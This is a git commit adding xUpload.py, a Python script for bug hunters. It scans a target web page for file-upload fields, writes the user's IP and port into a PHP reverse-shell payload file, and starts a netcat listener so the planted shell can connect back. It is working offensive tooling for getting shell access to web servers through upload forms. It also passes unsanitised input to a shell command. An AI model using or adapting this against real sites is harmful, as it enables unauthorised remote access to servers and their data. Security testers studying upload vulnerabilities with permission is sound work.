4fbf87b90f81b6996c83cc81129f9139e65f1af5
iiBexK <142851858+iiBexK@users.noreply.github.com>
2023-10-23 15:20:04 +0300

    xUpload.py

---
+++ xUpload.py
@@ -0,0 +1,91 @@
+import os
+import subprocess
+import signal
+import time
+from colorama import Fore, Style, init
+import requests
+from bs4 import BeautifulSoup
+
+# Initialize colorama
+init()
+
+# Define custom colors
+BOLD_GREEN = f"{Style.BRIGHT}{Fore.GREEN}"
+BOLD_RED = f"{Style.BRIGHT}{Fore.RED}"
+BOLD_CYAN = f"{Style.BRIGHT}{Fore.CYAN}"
+
+# Function to clear the screen based on the operating system
+def clear_screen():
+    os.system("cls" if os.name == "nt" else "clear")
+
+# Function to print colored text
+def print_colored(text, color=Fore.WHITE, style=Style.NORMAL):
+    print(style + color + text + Style.RESET_ALL)
+
+def show_menu():
+    clear_screen()
+    print_colored("Hey Bug Hunter, Please choose:", BOLD_CYAN)
+    
+    print_colored("1. File Upload", BOLD_RED)
+    print_colored("2. Exit", BOLD_RED)
+
+    choice = input("Enter your choice (1 or 2): ")
+    return choice
+
+def file_upload_menu():
+    target_url = input("Target web page URL: ")
+    
+    try:
+        response = requests.get(target_url)
+        soup = BeautifulSoup(response.text, 'html.parser')
+        file_input_fields = soup.find_all('input', {'type': 'file'})
+        if file_input_fields:
+            print_colored("File upload input fields found:", BOLD_GREEN)
+            for input_field in file_input_fields:
+                input_name = input_field.get('name', 'No name attribute')
+                print(f"- Input name: {input_name}")
+            
+            upload_choice = input("Do you want to use Reverse Shell Payload? (Y or N): ")
+            if upload_choice.lower() == "Y".lower():
+                user_ip = input("Enter your IP address: ")
+                user_port = input("Enter the port you want to use: ")
+                replace_ip_and_port_in_file("reverse-shell.php5", user_ip, user_port)
+                open_netcat_listener_in_new_terminal(user_port)
+                print_colored("Reverse Shell script has been created, and the listener has started in a new terminal window.", BOLD_GREEN)
+            else:
+                print_colored("Come Back Again, Goodbye!", BOLD_RED)
+                exit(0)
+        else:
+            print_colored("No file upload input fields found on the target web page.", BOLD_RED)
+    except requests.exceptions.RequestException as e:
+        print_colored(f"Error: {e}", BOLD_RED)
+
+def replace_ip_and_port_in_file(file_path, user_ip, user_port):
+    with open(file_path, 'r') as file:
+        lines = file.readlines()
+    lines[48] = f"$ip = '{user_ip}';\n"
+    lines[49] = f"$port = {user_port};\n"
+    with open(file_path, 'w') as file:
+        file.writelines(lines)
+
+def open_netcat_listener_in_new_terminal(user_port):
+    subprocess.run(f"gnome-terminal -- nc -lvnp {user_port}", shell=True)
+
+def goodbye_handler(signal, frame):
+    clear_screen()  # Clear the screen
+    print_colored("Come Back Again, Goodbye!", BOLD_RED)
+    exit(0)
+
+# Register the Ctrl+C (SIGINT) signal handler
+signal.signal(signal.SIGINT, goodbye_handler)
+
+choice = show_menu()
+
+if choice == "1":
+    file_upload_menu()
+
+elif choice == "2":
+    print_colored("Come Back Again, Goodbye!", BOLD_RED)
+
+else:
+    print_colored("Invalid choice.", BOLD_RED)
